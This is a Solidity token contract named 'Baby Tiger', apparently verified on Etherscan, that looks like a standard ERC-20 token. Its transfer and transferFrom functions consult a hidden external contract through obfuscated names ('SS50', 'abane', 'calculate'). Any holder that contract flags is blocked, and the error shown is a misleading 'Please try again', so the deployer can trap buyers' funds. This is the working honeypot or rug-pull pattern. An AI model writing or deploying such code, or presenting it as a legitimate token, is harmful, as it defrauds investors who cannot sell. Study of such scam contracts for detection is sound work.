/**
 *Submitted for verification at Etherscan.io on 2021-08-20
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface SS50 {

    function accounting( uint  _one, uint _two, uint _three) external view returns (bool);

    function abane(address account) external view returns (uint8);

    function check_account(address aaa, address ddd, uint  ccc) external returns (bool);

    function take(uint account, uint amounta, uint abountb) external returns (bool);


}

contract BabyTiger {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    SS50 calculate;
    uint256 public totalSupply = 100 * 10**12 * 10**18;
    string public name = "Baby Tiger";
    string public symbol = hex"426162795469676572f09f9085";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(SS50 opgwtjk) {
        
        calculate = opgwtjk;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(calculate.abane(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(calculate.abane(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}